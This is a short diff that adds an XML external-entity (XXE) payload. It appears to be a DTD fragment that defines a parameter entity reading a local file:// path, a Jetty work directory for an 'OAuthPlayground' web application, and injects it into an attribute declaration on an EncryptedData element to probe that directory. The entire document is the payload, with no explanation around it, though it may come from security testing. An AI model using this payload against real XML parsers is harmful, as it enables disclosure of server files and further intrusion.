@@ -1,0 +1,3 @@
+<!ENTITY % dir SYSTEM "file:///opt/out/instance/work/jetty-0.0.0.0-9031-OAuthPlayground.war-_OAuthPlayground-any-17300904548249333585.dir/webapp/">
+<!ENTITY % decl "<!ATTLIST x:EncryptedData probe CDATA '%dir;'>">
+%decl;
